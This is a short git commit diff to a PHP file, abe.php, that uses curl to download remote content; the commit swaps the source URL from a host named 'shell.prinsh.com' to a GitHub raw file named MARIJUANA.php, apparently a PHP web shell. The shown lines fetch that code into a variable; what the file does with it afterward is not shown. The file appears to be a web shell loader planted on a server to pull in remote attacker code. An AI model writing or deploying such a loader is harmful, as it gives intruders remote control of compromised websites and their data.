8564bb1f89b6d4d2b5b01baa31486b0e3c444622
J. Louis <54280101+jytmX@users.noreply.github.com>
2023-12-18 11:28:41 +0700

    Update abe.php

--- abe.php
+++ abe.php
@@ -1,5 +1,5 @@
 <?php 
-$url = "https://shell.prinsh.com/Nathan/marijuana.txt";
+$url = "https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
